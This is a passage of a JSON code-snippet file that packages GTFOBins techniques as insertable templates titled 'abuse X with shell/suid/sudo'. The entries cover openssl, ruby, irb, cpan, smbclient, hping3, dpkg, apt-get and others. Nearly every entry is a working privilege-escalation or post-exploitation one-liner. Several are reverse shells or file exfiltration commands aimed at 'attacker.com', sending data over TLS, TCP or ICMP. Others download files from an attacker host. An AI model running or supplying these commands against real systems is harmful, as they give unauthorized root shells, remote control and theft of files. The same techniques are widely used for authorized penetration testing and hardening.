            "```"
        ],
        "description": "abuse openssl with file-write"
    },
    "openssl file-read (gtfobins)": {
        "prefix": "openssl file-read",
        "body": [
            "abuse openssl with file-read",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "openssl enc -in \"\\$LFILE\"${0}",
            "```"
        ],
        "description": "abuse openssl with file-read"
    },
    "openssl suid (gtfobins)": {
        "prefix": "openssl suid",
        "body": [
            "abuse openssl with suid",
            "",
            "```sh",
            "LFILE=${1:file_to_write}",
            "echo DATA | openssl enc -out \"\\$LFILE\"${0}",
            "```"
        ],
        "description": "abuse openssl with suid"
    },
    "openssl sudo (gtfobins)": {
        "prefix": "openssl sudo",
        "body": [
            "abuse openssl with sudo, \nTo receive the shell run the following on the attacker box:\n\n\n\n    openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes\n\n    openssl s_server -quiet -key key.pem -cert cert.pem -port 12345\n\n\n\nCommunication between attacker and target will be encrypted.\n",
            "",
            "```sh",
            "RHOST=${1:attacker.com}",
            "RPORT=${2:12345}",
            "mkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | sudo openssl s_client -quiet -connect \\$RHOST:\\$RPORT > /tmp/s; rm /tmp/s${0}",
            "```"
        ],
        "description": "abuse openssl with sudo - \nTo receive the shell run the following on the attacker box:\n\n\n\n    openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes\n\n    openssl s_server -quiet -key key.pem -cert cert.pem -port 12345\n\n\n\nCommunication between attacker and target will be encrypted.\n"
    },
    "openssl library-load (gtfobins)": {
        "prefix": "openssl library-load",
        "body": [
            "abuse openssl with library-load",
            "",
            "```sh",
            "openssl req -engine ./lib.so${0}",
            "```"
        ],
        "description": "abuse openssl with library-load"
    },
    "unexpand file-read (gtfobins)": {
        "prefix": "unexpand file-read",
        "body": [
            "abuse unexpand with file-read",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "unexpand -t99999999 \"\\$LFILE\"${0}",
            "```"
        ],
        "description": "abuse unexpand with file-read"
    },
    "unexpand suid (gtfobins)": {
        "prefix": "unexpand suid",
        "body": [
            "abuse unexpand with suid",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "./unexpand -t99999999 \"\\$LFILE\"${0}",
            "```"
        ],
        "description": "abuse unexpand with suid"
    },
    "unexpand sudo (gtfobins)": {
        "prefix": "unexpand sudo",
        "body": [
            "abuse unexpand with sudo",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "sudo unexpand -t99999999 \"\\$LFILE\"${0}",
            "```"
        ],
        "description": "abuse unexpand with sudo"
    },
    "scanmem shell (gtfobins)": {
        "prefix": "scanmem shell",
        "body": [
            "abuse scanmem with shell",
            "",
            "```sh",
            "scanmem",
            "shell /bin/sh${0}",
            "```"
        ],
        "description": "abuse scanmem with shell"
    },
    "scanmem suid (gtfobins)": {
        "prefix": "scanmem suid",
        "body": [
            "abuse scanmem with suid",
            "",
            "```sh",
            "./scanmem",
            "shell /bin/sh${0}",
            "```"
        ],
        "description": "abuse scanmem with suid"
    },
    "scanmem sudo (gtfobins)": {
        "prefix": "scanmem sudo",
        "body": [
            "abuse scanmem with sudo",
            "",
            "```sh",
            "sudo scanmem",
            "shell /bin/sh${0}",
            "```"
        ],
        "description": "abuse scanmem with sudo"
    },
    "smbclient shell (gtfobins)": {
        "prefix": "smbclient shell",
        "body": [
            "abuse smbclient with shell",
            "",
            "```sh",
            "smbclient '\\\\attacker\\share'",
            "!/bin/sh${0}",
            "```"
        ],
        "description": "abuse smbclient with shell"
    },
    "smbclient file-upload (gtfobins)": {
        "prefix": "smbclient file-upload",
        "body": [
            "abuse smbclient with file-upload, Install [Impacket](https://github.com/SecureAuthCorp/impacket) and run `sudo smbserver.py share /tmp` on the attacker box to collect the file.",
            "",
            "```sh",
            "smbclient '\\\\attacker\\share' -c 'put ${1:file_to_send} where_to_save'${0}",
            "```"
        ],
        "description": "abuse smbclient with file-upload - Install [Impacket](https://github.com/SecureAuthCorp/impacket) and run `sudo smbserver.py share /tmp` on the attacker box to collect the file."
    },
    "smbclient file-download (gtfobins)": {
        "prefix": "smbclient file-download",
        "body": [
            "abuse smbclient with file-download, Install [Impacket](https://github.com/SecureAuthCorp/impacket) and run `sudo smbserver.py share /tmp` on the attacker box to send the file.",
            "",
            "```sh",
            "smbclient '\\\\attacker\\share' -c 'put ${1:file_to_send} where_to_save'${0}",
            "```"
        ],
        "description": "abuse smbclient with file-download - Install [Impacket](https://github.com/SecureAuthCorp/impacket) and run `sudo smbserver.py share /tmp` on the attacker box to send the file."
    },
    "smbclient sudo (gtfobins)": {
        "prefix": "smbclient sudo",
        "body": [
            "abuse smbclient with sudo",
            "",
            "```sh",
            "sudo smbclient '\\\\attacker\\share'",
            "!/bin/sh${0}",
            "```"
        ],
        "description": "abuse smbclient with sudo"
    },
    "task shell (gtfobins)": {
        "prefix": "task shell",
        "body": [
            "abuse task with shell",
            "",
            "```sh",
            "task execute /bin/sh${0}",
            "```"
        ],
        "description": "abuse task with shell"
    },
    "task sudo (gtfobins)": {
        "prefix": "task sudo",
        "body": [
            "abuse task with sudo",
            "",
            "```sh",
            "sudo task execute /bin/sh${0}",
            "```"
        ],
        "description": "abuse task with sudo"
    },
    "knife shell (gtfobins)": {
        "prefix": "knife shell",
        "body": [
            "abuse knife with shell",
            "",
            "```sh",
            "knife exec -E 'exec \"/bin/sh\"'${0}",
            "```"
        ],
        "description": "abuse knife with shell"
    },
    "knife sudo (gtfobins)": {
        "prefix": "knife sudo",
        "body": [
            "abuse knife with sudo",
            "",
            "```sh",
            "sudo knife exec -E 'exec \"/bin/sh\"'${0}",
            "```"
        ],
        "description": "abuse knife with sudo"
    },
    "debugfs shell (gtfobins)": {
        "prefix": "debugfs shell",
        "body": [
            "abuse debugfs with shell",
            "",
            "```sh",
            "debugfs",
            "!/bin/sh${0}",
            "```"
        ],
        "description": "abuse debugfs with shell"
    },
    "debugfs suid (gtfobins)": {
        "prefix": "debugfs suid",
        "body": [
            "abuse debugfs with suid",
            "",
            "```sh",
            "./debugfs",
            "!/bin/sh${0}",
            "```"
        ],
        "description": "abuse debugfs with suid"
    },
    "debugfs sudo (gtfobins)": {
        "prefix": "debugfs sudo",
        "body": [
            "abuse debugfs with sudo",
            "",
            "```sh",
            "sudo debugfs",
            "!/bin/sh${0}",
            "```"
        ],
        "description": "abuse debugfs with sudo"
    },
    "service shell (gtfobins)": {
        "prefix": "service shell",
        "body": [
            "abuse service with shell",
            "",
            "```sh",
            "/usr/sbin/service ../../bin/sh${0}",
            "```"
        ],
        "description": "abuse service with shell"
    },
    "service sudo (gtfobins)": {
        "prefix": "service sudo",
        "body": [
            "abuse service with sudo",
            "",
            "```sh",
            "sudo service ../../bin/sh${0}",
            "```"
        ],
        "description": "abuse service with sudo"
    },
    "check_by_ssh shell (gtfobins)": {
        "prefix": "check_by_ssh shell",
        "body": [
            "abuse check_by_ssh with shell, The shell will only last 10 seconds.",
            "",
            "```sh",
            "check_by_ssh -o \"ProxyCommand /bin/sh -i <\\$(tty) |& tee \\$(tty)\" -H localhost -C xx${0}",
            "```"
        ],
        "description": "abuse check_by_ssh with shell - The shell will only last 10 seconds."
    },
    "check_by_ssh sudo (gtfobins)": {
        "prefix": "check_by_ssh sudo",
        "body": [
            "abuse check_by_ssh with sudo, The shell will only last 10 seconds.",
            "",
            "```sh",
            "sudo check_by_ssh -o \"ProxyCommand /bin/sh -i <\\$(tty) |& tee \\$(tty)\" -H localhost -C xx${0}",
            "```"
        ],
        "description": "abuse check_by_ssh with sudo - The shell will only last 10 seconds."
    },
    "cdist shell (gtfobins)": {
        "prefix": "cdist shell",
        "body": [
            "abuse cdist with shell",
            "",
            "```sh",
            "cdist shell -s /bin/sh${0}",
            "```"
        ],
        "description": "abuse cdist with shell"
    },
    "cdist sudo (gtfobins)": {
        "prefix": "cdist sudo",
        "body": [
            "abuse cdist with sudo",
            "",
            "```sh",
            "sudo cdist shell -s /bin/sh${0}",
            "```"
        ],
        "description": "abuse cdist with sudo"
    },
    "genie shell (gtfobins)": {
        "prefix": "genie shell",
        "body": [
            "abuse genie with shell",
            "",
            "```sh",
            "genie -c '/bin/sh'${0}",
            "```"
        ],
        "description": "abuse genie with shell"
    },
    "genie suid (gtfobins)": {
        "prefix": "genie suid",
        "body": [
            "abuse genie with suid",
            "",
            "```sh",
            "./genie -c '/bin/sh'${0}",
            "```"
        ],
        "description": "abuse genie with suid"
    },
    "genie sudo (gtfobins)": {
        "prefix": "genie sudo",
        "body": [
            "abuse genie with sudo",
            "",
            "```sh",
            "sudo genie -c '/bin/sh'${0}",
            "```"
        ],
        "description": "abuse genie with sudo"
    },
    "gzip file-read (gtfobins)": {
        "prefix": "gzip file-read",
        "body": [
            "abuse gzip with file-read",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "gzip -c \\$LFILE | gzip -d${0}",
            "```"
        ],
        "description": "abuse gzip with file-read"
    },
    "gzip suid (gtfobins)": {
        "prefix": "gzip suid",
        "body": [
            "abuse gzip with suid",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "./gzip -f \\$LFILE -t${0}",
            "```"
        ],
        "description": "abuse gzip with suid"
    },
    "gzip sudo (gtfobins)": {
        "prefix": "gzip sudo",
        "body": [
            "abuse gzip with sudo",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "sudo gzip -f \\$LFILE -t${0}",
            "```"
        ],
        "description": "abuse gzip with sudo"
    },
    "posh shell (gtfobins)": {
        "prefix": "posh shell",
        "body": [
            "abuse posh with shell",
            "",
            "```sh",
            "posh${0}",
            "```"
        ],
        "description": "abuse posh with shell"
    },
    "posh limited-suid (gtfobins)": {
        "prefix": "posh limited-suid",
        "body": [
            "abuse posh with limited-suid",
            "",
            "```sh",
            "./posh${0}",
            "```"
        ],
        "description": "abuse posh with limited-suid"
    },
    "posh sudo (gtfobins)": {
        "prefix": "posh sudo",
        "body": [
            "abuse posh with sudo",
            "",
            "```sh",
            "sudo posh${0}",
            "```"
        ],
        "description": "abuse posh with sudo"
    },
    "links file-read (gtfobins)": {
        "prefix": "links file-read",
        "body": [
            "abuse links with file-read",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "links \"\\$LFILE\"${0}",
            "```"
        ],
        "description": "abuse links with file-read"
    },
    "links suid (gtfobins)": {
        "prefix": "links suid",
        "body": [
            "abuse links with suid",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "./links \"\\$LFILE\"${0}",
            "```"
        ],
        "description": "abuse links with suid"
    },
    "links sudo (gtfobins)": {
        "prefix": "links sudo",
        "body": [
            "abuse links with sudo",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "sudo links \"\\$LFILE\"${0}",
            "```"
        ],
        "description": "abuse links with sudo"
    },
    "dpkg shell (gtfobins)": {
        "prefix": "dpkg shell",
        "body": [
            "abuse dpkg with shell, This invokes the default pager, which is likely to be [`less`](/gtfobins/less/), other functions may apply.",
            "",
            "```sh",
            "dpkg -l",
            "!/bin/sh${0}",
            "```"
        ],
        "description": "abuse dpkg with shell - This invokes the default pager, which is likely to be [`less`](/gtfobins/less/), other functions may apply."
    },
    "dpkg sudo (gtfobins)": {
        "prefix": "dpkg sudo",
        "body": [
            "abuse dpkg with sudo, \nIt runs an interactive shell using a specially crafted Debian package. Generate it with [fpm](https://github.com/jordansissel/fpm) and upload it to the target.\n\n```\n\nTF=$(mktemp -d)\n\necho 'exec /bin/sh' > $TF/x.sh\n\nfpm -n x -s dir -t deb -a all --before-install $TF/x.sh $TF\n\n```\n",
            "",
            "```sh",
            "sudo dpkg -i x_1.0_all.deb${0}",
            "```"
        ],
        "description": "abuse dpkg with sudo - \nIt runs an interactive shell using a specially crafted Debian package. Generate it with [fpm](https://github.com/jordansissel/fpm) and upload it to the target.\n\n```\n\nTF=$(mktemp -d)\n\necho 'exec /bin/sh' > $TF/x.sh\n\nfpm -n x -s dir -t deb -a all --before-install $TF/x.sh $TF\n\n```\n"
    },
    "iconv file-write (gtfobins)": {
        "prefix": "iconv file-write",
        "body": [
            "abuse iconv with file-write",
            "",
            "```sh",
            "LFILE=${1:file_to_write}",
            "echo \"DATA\" | iconv -f 8859_1 -t 8859_1 -o \"\\$LFILE\"${0}",
            "```"
        ],
        "description": "abuse iconv with file-write"
    },
    "iconv file-read (gtfobins)": {
        "prefix": "iconv file-read",
        "body": [
            "abuse iconv with file-read",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "iconv -f 8859_1 -t 8859_1 \"\\$LFILE\"${0}",
            "```"
        ],
        "description": "abuse iconv with file-read"
    },
    "iconv suid (gtfobins)": {
        "prefix": "iconv suid",
        "body": [
            "abuse iconv with suid",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "./iconv -f 8859_1 -t 8859_1 \"\\$LFILE\"${0}",
            "```"
        ],
        "description": "abuse iconv with suid"
    },
    "iconv sudo (gtfobins)": {
        "prefix": "iconv sudo",
        "body": [
            "abuse iconv with sudo",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "./iconv -f 8859_1 -t 8859_1 \"\\$LFILE\"${0}",
            "```"
        ],
        "description": "abuse iconv with sudo"
    },
    "grep file-read (gtfobins)": {
        "prefix": "grep file-read",
        "body": [
            "abuse grep with file-read",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "grep '' \\$LFILE${0}",
            "```"
        ],
        "description": "abuse grep with file-read"
    },
    "grep suid (gtfobins)": {
        "prefix": "grep suid",
        "body": [
            "abuse grep with suid",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "./grep '' \\$LFILE${0}",
            "```"
        ],
        "description": "abuse grep with suid"
    },
    "grep sudo (gtfobins)": {
        "prefix": "grep sudo",
        "body": [
            "abuse grep with sudo",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "sudo grep '' \\$LFILE${0}",
            "```"
        ],
        "description": "abuse grep with sudo"
    },
    "hping3 shell (gtfobins)": {
        "prefix": "hping3 shell",
        "body": [
            "abuse hping3 with shell",
            "",
            "```sh",
            "hping3",
            "/bin/sh${0}",
            "```"
        ],
        "description": "abuse hping3 with shell"
    },
    "hping3 suid (gtfobins)": {
        "prefix": "hping3 suid",
        "body": [
            "abuse hping3 with suid",
            "",
            "```sh",
            "./hping3",
            "/bin/sh -p${0}",
            "```"
        ],
        "description": "abuse hping3 with suid"
    },
    "hping3 sudo (gtfobins)": {
        "prefix": "hping3 sudo",
        "body": [
            "abuse hping3 with sudo, \nThe file is continuously sent, adjust the `--count` parameter or kill the sender when done. Receive on the attacker box with:\n\n\n\n```\n\nsudo hping3 --icmp --listen xxx --dump\n\n```\n",
            "",
            "```sh",
            "RHOST=${2:attacker.com}",
            "LFILE=${1:file_to_read}",
            "sudo hping3 \"\\$RHOST\" --icmp --data 500 --sign xxx --file \"\\$LFILE\"${0}",
            "```"
        ],
        "description": "abuse hping3 with sudo - \nThe file is continuously sent, adjust the `--count` parameter or kill the sender when done. Receive on the attacker box with:\n\n\n\n```\n\nsudo hping3 --icmp --listen xxx --dump\n\n```\n"
    },
    "irb shell (gtfobins)": {
        "prefix": "irb shell",
        "body": [
            "abuse irb with shell",
            "",
            "```sh",
            "irb",
            "exec '/bin/bash'${0}",
            "```"
        ],
        "description": "abuse irb with shell"
    },
    "irb reverse-shell (gtfobins)": {
        "prefix": "irb reverse-shell",
        "body": [
            "abuse irb with reverse-shell, Run `nc -l -p 12345` on the attacker box to receive the shell.",
            "",
            "```sh",
            "export RHOST='127.0.0.1'",
            "export RPORT=9000",
            "irb",
            "require 'socket'; exit if fork;c=TCPSocket.new(ENV[\"RHOST\"],ENV[\"RPORT\"]);while(cmd=c.gets);IO.popen(cmd,\"r\"){|io|c.print io.read} end${0}",
            "```"
        ],
        "description": "abuse irb with reverse-shell - Run `nc -l -p 12345` on the attacker box to receive the shell."
    },
    "irb file-upload (gtfobins)": {
        "prefix": "irb file-upload",
        "body": [
            "abuse irb with file-upload, Serve files in the local folder running an HTTP server on port 8888.",
            "",
            "```sh",
            "irb",
            "require 'webrick'; WEBrick::HTTPServer.new(:Port => 8888, :DocumentRoot => Dir.pwd).start;${0}",
            "```"
        ],
        "description": "abuse irb with file-upload - Serve files in the local folder running an HTTP server on port 8888."
    },
    "irb file-download (gtfobins)": {
        "prefix": "irb file-download",
        "body": [
            "abuse irb with file-download, Fetch a remote file via HTTP GET request.",
            "",
            "```sh",
            "export URL=http://${2:attacker.com}/file_to_get",
            "export LFILE=${1:file_to_save}",
            "irb",
            "require 'open-uri'; download = open(ENV['URL']); IO.copy_stream(download, ENV['LFILE'])${0}",
            "```"
        ],
        "description": "abuse irb with file-download - Fetch a remote file via HTTP GET request."
    },
    "irb file-write (gtfobins)": {
        "prefix": "irb file-write",
        "body": [
            "abuse irb with file-write",
            "",
            "```sh",
            "irb",
            "File.open(\"${1:file_to_write}\", \"w+\") { |f| f.write(\"DATA\") }${0}",
            "```"
        ],
        "description": "abuse irb with file-write"
    },
    "irb file-read (gtfobins)": {
        "prefix": "irb file-read",
        "body": [
            "abuse irb with file-read",
            "",
            "```sh",
            "irb",
            "puts File.read(\"${1:file_to_read}\")${0}",
            "```"
        ],
        "description": "abuse irb with file-read"
    },
    "irb library-load (gtfobins)": {
        "prefix": "irb library-load",
        "body": [
            "abuse irb with library-load",
            "",
            "```sh",
            "irb",
            "require \"fiddle\"; Fiddle.dlopen(\"lib.so\")${0}",
            "```"
        ],
        "description": "abuse irb with library-load"
    },
    "irb sudo (gtfobins)": {
        "prefix": "irb sudo",
        "body": [
            "abuse irb with sudo",
            "",
            "```sh",
            "sudo irb",
            "exec '/bin/bash'${0}",
            "```"
        ],
        "description": "abuse irb with sudo"
    },
    "apt-get shell (gtfobins)": {
        "prefix": "apt-get shell",
        "body": [
            "abuse apt-get with shell, This invokes the default pager, which is likely to be [`less`](/gtfobins/less/), other functions may apply.",
            "",
            "```sh",
            "apt-get changelog apt",
            "!/bin/sh${0}",
            "```"
        ],
        "description": "abuse apt-get with shell - This invokes the default pager, which is likely to be [`less`](/gtfobins/less/), other functions may apply."
    },
    "apt-get sudo (gtfobins)": {
        "prefix": "apt-get sudo",
        "body": [
            "abuse apt-get with sudo, When the shell exits the `update` command is actually executed.",
            "",
            "```sh",
            "sudo apt-get update -o APT::Update::Pre-Invoke::=/bin/sh${0}",
            "```"
        ],
        "description": "abuse apt-get with sudo - When the shell exits the `update` command is actually executed."
    },
    "cpan shell (gtfobins)": {
        "prefix": "cpan shell",
        "body": [
            "abuse cpan with shell, \n`cpan` lets you execute perl commands with the `! command`.\n",
            "",
            "```sh",
            "cpan",
            "! exec '/bin/bash'${0}",
            "```"
        ],
        "description": "abuse cpan with shell - \n`cpan` lets you execute perl commands with the `! command`.\n"
    },
    "cpan reverse-shell (gtfobins)": {
        "prefix": "cpan reverse-shell",
        "body": [
            "abuse cpan with reverse-shell, Run `nc -lvp RPORT` on the attacker box to receive the shell.",
            "",
            "```sh",
            "export RHOST=localhost",
            "export RPORT=9000",
            "cpan",
            "! use Socket; my \\$i=\"\\$ENV{RHOST}\"; my \\$p=\\$ENV{RPORT}; socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\")); if(connect(S,sockaddr_in(\\$p,inet_aton(\\$i)))){open(STDIN,\">&S\"); open(STDOUT,\">&S\"); open(STDERR,\">&S\"); exec(\"/bin/sh -i\");};${0}",
            "```"
        ],
        "description": "abuse cpan with reverse-shell - Run `nc -lvp RPORT` on the attacker box to receive the shell."
    },
    "cpan file-upload (gtfobins)": {
        "prefix": "cpan file-upload",
        "body": [
            "abuse cpan with file-upload, Serve files in the local folder running an HTTP server on port 8080. Install the dependency via `cpan HTTP::Server::Simple`.",
            "",
            "```sh",
            "cpan",
            "! use HTTP::Server::Simple; my \\$server= HTTP::Server::Simple->new(); \\$server->run();${0}",
            "```"
        ],
        "description": "abuse cpan with file-upload - Serve files in the local folder running an HTTP server on port 8080. Install the dependency via `cpan HTTP::Server::Simple`."
    },
    "cpan file-download (gtfobins)": {
        "prefix": "cpan file-download",
        "body": [
            "abuse cpan with file-download, Fetch a remote file via an HTTP GET request and store it in `PWD`.",
            "",
            "```sh",
            "export URL=http://${1:attacker.com}/file_to_get",
            "cpan",
            "! use File::Fetch; my \\$file = (File::Fetch->new(uri => \"\\$ENV{URL}\"))->fetch();${0}",
            "```"
        ],
        "description": "abuse cpan with file-download - Fetch a remote file via an HTTP GET request and store it in `PWD`."
    },
    "cpan sudo (gtfobins)": {
        "prefix": "cpan sudo",
        "body": [
            "abuse cpan with sudo",
            "",
            "```sh",
            "sudo cpan",
            "! exec '/bin/bash'${0}",
            "```"
        ],
        "description": "abuse cpan with sudo"
    },
    "distcc shell (gtfobins)": {
        "prefix": "distcc shell",
        "body": [
            "abuse distcc with shell",
            "",
            "```sh",
            "distcc /bin/sh${0}",
            "```"
        ],
        "description": "abuse distcc with shell"
    },
    "distcc suid (gtfobins)": {
        "prefix": "distcc suid",
        "body": [
            "abuse distcc with suid",
            "",
            "```sh",
            "./distcc /bin/sh -p${0}",
            "```"
        ],
        "description": "abuse distcc with suid"
    },
    "distcc sudo (gtfobins)": {
        "prefix": "distcc sudo",
        "body": [
            "abuse distcc with sudo",
            "",
            "```sh",
            "sudo distcc /bin/sh${0}",
            "```"
        ],
        "description": "abuse distcc with sudo"
    },
    "batcat shell (gtfobins)": {
        "prefix": "batcat shell",
        "body": [
            "abuse batcat with shell",
            "",
            "```sh",
            "batcat --paging always /etc/profile",
            "!/bin/sh${0}",
            "```"
        ],
        "description": "abuse batcat with shell"
    },
    "batcat limited-suid (gtfobins)": {
        "prefix": "batcat limited-suid",
        "body": [
            "abuse batcat with limited-suid",
            "",
            "```sh",
            "./batcat --paging always /etc/profile",
            "!/bin/sh${0}",
            "```"
        ],
        "description": "abuse batcat with limited-suid"
    },
    "batcat sudo (gtfobins)": {
        "prefix": "batcat sudo",
        "body": [
            "abuse batcat with sudo",
            "",
            "```sh",
            "sudo batcat --paging always /etc/profile",
            "!/bin/sh${0}",
            "```"
        ],
        "description": "abuse batcat with sudo"
    },
    "strace file-write (gtfobins)": {
        "prefix": "strace file-write",
        "body": [
            "abuse strace with file-write, The data to be written appears amid the syscall log, quoted and with special characters escaped in octal notation. The string representation will be truncated, pick a value big enough. More generally, any binary that executes whatever syscall passing arbitrary data can be used in place of `strace - DATA`.",
            "",
            "```sh",
            "LFILE=${1:file_to_write}",
            "strace -s 999 -o \\$LFILE strace - DATA${0}",
            "```"
        ],
        "description": "abuse strace with file-write - The data to be written appears amid the syscall log, quoted and with special characters escaped in octal notation. The string representation will be truncated, pick a value big enough. More generally, any binary that executes whatever syscall passing arbitrary data can be used in place of `strace - DATA`."
    },
    "strace shell (gtfobins)": {
        "prefix": "strace shell",
        "body": [
            "abuse strace with shell",
            "",
            "```sh",
            "strace -o /dev/null /bin/sh${0}",
            "```"
        ],
        "description": "abuse strace with shell"
    },
    "strace suid (gtfobins)": {
        "prefix": "strace suid",
        "body": [
            "abuse strace with suid",
            "",
            "```sh",
            "./strace -o /dev/null /bin/sh -p${0}",
            "```"
        ],
        "description": "abuse strace with suid"
    },
    "strace sudo (gtfobins)": {
        "prefix": "strace sudo",
        "body": [
            "abuse strace with sudo",
            "",
            "```sh",
            "sudo strace -o /dev/null /bin/sh${0}",
            "```"
        ],
        "description": "abuse strace with sudo"
    },
    "redcarpet file-read (gtfobins)": {
        "prefix": "redcarpet file-read",
        "body": [
            "abuse redcarpet with file-read",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "redcarpet \"\\$LFILE\"${0}",
            "```"
        ],
        "description": "abuse redcarpet with file-read"
    },
    "redcarpet sudo (gtfobins)": {
        "prefix": "redcarpet sudo",
        "body": [
            "abuse redcarpet with sudo",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "sudo redcarpet \"\\$LFILE\"${0}",
            "```"
        ],
        "description": "abuse redcarpet with sudo"
    },
    "ruby shell (gtfobins)": {
        "prefix": "ruby shell",
        "body": [
            "abuse ruby with shell",
            "",
            "```sh",
            "ruby -e 'exec \"/bin/sh\"'${0}",
            "```"
        ],
        "description": "abuse ruby with shell"
    },
    "ruby reverse-shell (gtfobins)": {
        "prefix": "ruby reverse-shell",
        "body": [
            "abuse ruby with reverse-shell, Run `nc -l -p 12345` on the attacker box to receive the shell.",
            "",
            "```sh",
            "export RHOST=${1:attacker.com}",
            "export RPORT=${2:12345}",
            "ruby -rsocket -e 'exit if fork;c=TCPSocket.new(ENV[\"RHOST\"],ENV[\"RPORT\"]);while(cmd=c.gets);IO.popen(cmd,\"r\"){|io|c.print io.read}end'${0}",
            "```"
        ],
        "description": "abuse ruby with reverse-shell - Run `nc -l -p 12345` on the attacker box to receive the shell."
    },
    "ruby file-upload (gtfobins)": {
        "prefix": "ruby file-upload",
        "body": [
            "abuse ruby with file-upload, Serve files in the local folder running an HTTP server. This requires version 1.9.2 or later.",
            "",
            "```sh",
            "export LPORT=8888",
            "ruby -run -e httpd . -p \\$LPORT${0}",
            "```"
        ],
        "description": "abuse ruby with file-upload - Serve files in the local folder running an HTTP server. This requires version 1.9.2 or later."
    },
    "ruby file-download (gtfobins)": {
        "prefix": "ruby file-download",
        "body": [
            "abuse ruby with file-download, Fetch a remote file via HTTP GET request.",
            "",
            "```sh",
            "export URL=http://${2:attacker.com}/file_to_get",
            "export LFILE=${1:file_to_save}",
            "ruby -e 'require \"open-uri\"; download = open(ENV[\"URL\"]); IO.copy_stream(download, ENV[\"LFILE\"])'${0}",
            "```"
        ],
        "description": "abuse ruby with file-download - Fetch a remote file via HTTP GET request."
    },
    "ruby file-write (gtfobins)": {
        "prefix": "ruby file-write",
        "body": [
            "abuse ruby with file-write",
            "",
            "```sh",
            "ruby -e 'File.open(\"${1:file_to_write}\", \"w+\") { |f| f.write(\"DATA\") }'${0}",
            "```"
        ],
        "description": "abuse ruby with file-write"
    },
    "ruby file-read (gtfobins)": {
        "prefix": "ruby file-read",
        "body": [
            "abuse ruby with file-read",
            "",
            "```sh",
            "ruby -e 'puts File.read(\"${1:file_to_read}\")'${0}",
            "```"
        ],
        "description": "abuse ruby with file-read"
    },
    "ruby library-load (gtfobins)": {
        "prefix": "ruby library-load",
        "body": [
            "abuse ruby with library-load",
            "",
            "```sh",
            "ruby -e 'require \"fiddle\"; Fiddle.dlopen(\"lib.so\")'${0}",
            "```"
        ],
        "description": "abuse ruby with library-load"
    },
    "ruby sudo (gtfobins)": {
        "prefix": "ruby sudo",
        "body": [
            "abuse ruby with sudo",
            "",
            "```sh",
            "sudo ruby -e 'exec \"/bin/sh\"'${0}",
            "```"
        ],
        "description": "abuse ruby with sudo"
    },
    "ruby capabilities (gtfobins)": {
        "prefix": "ruby capabilities",
        "body": [
            "abuse ruby with capabilities",
            "",
            "```sh",
            "./ruby -e 'Process::Sys.setuid(0); exec \"/bin/sh\"'${0}",
            "```"
        ],
        "description": "abuse ruby with capabilities"
    },
    "csh shell (gtfobins)": {
        "prefix": "csh shell",
        "body": [
            "abuse csh with shell",
            "",
            "```sh",
            "csh${0}",
            "```"
        ],
        "description": "abuse csh with shell"
    },
    "csh file-write (gtfobins)": {
        "prefix": "csh file-write",
        "body": [
            "abuse csh with file-write",
            "",
            "```sh",
            "export LFILE=${1:file_to_write}",
            "ash -c 'echo DATA > \\$LFILE'${0}",
            "```"
        ],
        "description": "abuse csh with file-write"
    },
    "csh suid (gtfobins)": {
        "prefix": "csh suid",
        "body": [
            "abuse csh with suid",
            "",
            "```sh",
            "./csh -b${0}",
            "```"
        ],
        "description": "abuse csh with suid"
    },
    "csh sudo (gtfobins)": {
        "prefix": "csh sudo",
        "body": [
            "abuse csh with sudo",
            "",
            "```sh",
            "sudo csh${0}",
            "```"
        ],
        "description": "abuse csh with sudo"
    },
    "ul file-read (gtfobins)": {
        "prefix": "ul file-read",
        "body": [
            "abuse ul with file-read",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "ul \"\\$LFILE\"${0}",
            "```"
        ],
        "description": "abuse ul with file-read"
    },
    "ul suid (gtfobins)": {
        "prefix": "ul suid",
        "body": [
            "abuse ul with suid",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "./ul \"\\$LFILE\"${0}",
            "```"
        ],
        "description": "abuse ul with suid"
    },
    "ul sudo (gtfobins)": {
        "prefix": "ul sudo",
        "body": [
            "abuse ul with sudo",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "sudo ul \"\\$LFILE\"${0}",
            "```"
        ],
        "description": "abuse ul with sudo"
    },
    "genisoimage file-read (gtfobins)": {
        "prefix": "genisoimage file-read",
        "body": [
            "abuse genisoimage with file-read",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "genisoimage -q -o - \"\\$LFILE\"${0}",
            "```"
        ],
        "description": "abuse genisoimage with file-read"
    },
    "genisoimage suid (gtfobins)": {
        "prefix": "genisoimage suid",
        "body": [
            "abuse genisoimage with suid, The file is parsed, and some of its content is disclosed by the error messages, thus this might not be suitable to read arbitrary data.",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "./genisoimage -sort \"\\$LFILE\"${0}",
            "```"
        ],
        "description": "abuse genisoimage with suid - The file is parsed, and some of its content is disclosed by the error messages, thus this might not be suitable to read arbitrary data."
    },
    "genisoimage sudo (gtfobins)": {
        "prefix": "genisoimage sudo",
        "body": [
            "abuse genisoimage with sudo",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "sudo genisoimage -q -o - \"\\$LFILE\"${0}",
            "```"
        ],
        "description": "abuse genisoimage with sudo"
    },
    "facter shell (gtfobins)": {
        "prefix": "facter shell",
        "body": [
